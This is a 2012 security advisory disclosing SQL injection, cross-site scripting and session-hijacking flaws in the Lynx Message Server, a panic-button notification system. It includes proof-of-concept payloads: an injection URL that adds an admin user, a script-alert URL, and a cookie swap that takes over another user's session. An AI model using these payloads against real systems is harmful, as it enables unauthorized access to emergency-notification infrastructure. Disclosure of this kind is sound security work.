@@ -1,0 +1,91 @@
+1. Summary
+
+The Micro Technology Services Inc. "Lynx Message Server 7.11.10.2" and/or
+"LynxTCPService version 1.1.62" web interface is vulnerable to SQL
+Injection, Cross-Site Scripting, and other security problems.
+
+2. Description
+
+Lynx is a "Facility wide Duress and Emergency Notification" system
+developed by Micro Technology Services, Inc. (http://www.lynxguide.com/)
+out of Richardson, Texas.  The product is designed to "address the issue
+of making it more cost effective to install panic buttons and improve
+group and mass communication in large facilities or groups of facilities
+on the same network."  By submitting malicious input to certain fields, it
+is possible to add administrative users to the system without credentials
+using SQL injection, and inject code in the security context of the
+server.  With access to session network traffic, It is also possible to
+hijack sessions and sniff user ID's and passwords.
+
+3. Proof of Concept
+
+3a.  SQL Injection example - to add an admin user to the system, visit a
+URL such as:
+
+http://victim/cgi/email_password.plx?UserID=a'%3BINSERT+INTO+Users([User],[Password])+VALUES+('bede','bede')%3Bselect+Users.[Password],+Users.[User]+from+USERS+where+Users.[User]='b
+
+Then go to http://victim/cgi/logon.plx to log in with the newly created
+account
+
+3b.  Cross-Site Scripting (XSS) example - to generate an XSS popup, visit
+a URL such as:
+
+http://victim/cgi/wrapper.plx?Destination=addequipment.htm&Title=<script>alert('XSS')</script>
+
+this CGI Binary does require you to be logged in in order to work,
+limiting its effectiveness.
+
+3c.  Session hijacking example - to change your session to another user's
+currently logged in session, log into the server and intercept the Cookie
+and change it to the value of another user, perhaps one intercepted with a
+proxy or sniffer.  For example, you might change your own session:
+
+Set-Cookie: Access_Num=1.304931640625e%2B019%7C%7C; path=/; expires=Fri,
+23-Mar-2012 06:59:01 GMT
+
+to that of another user:
+
+Set-Cookie: Access_Num=7.408447265625e%2B019%7C%7C; path=/; expires=Fri,
+23-Mar-2012 06:59:01 GMT
+
+and you will now be logged in as that user
+
+4. Impact
+
+Ability to add users, modify data, inject code in the security context of
+the server, take over sessions and possibly other attacks.
+
+5. Affected Products
+
+The exact versions of affected software are unknown to the authors.  The
+two services running appear to be:
+
+"Lynx Message Server 7.11.10.2" and "LynxTCPService version 1.1.62"
+
+
+6. Solution
+
+The vendor claims that the input validation issues (SQL Injection and XSS)
+have been fixed in version "7.12.4.1".  The authors have not verified
+these claims.  Customers must contact the vendor to arrange for
+installation of updated software.  A fix for the session management and
+plaintext protocol usage issues is not available.  However, the use of a
+front-end HTTP proxy supporting SSL encryption may partially mitigate
+these risks.
+
+
+7. Timetable
+
+2012-03-22 Advisory written
+2012-03-22 Vendor responds with intention to analyze and fix issues
+2012-04-23 Vendor advises that partial fix is available
+2012-05-03 Public disclosure
+
+8. Reference
+
+http://www.foofus.net/?page_id=562
+
+9. Credits
+
+bede@foofus.net (Mark Lachniet)
+psyonik@foofus.net (David Reflexia)
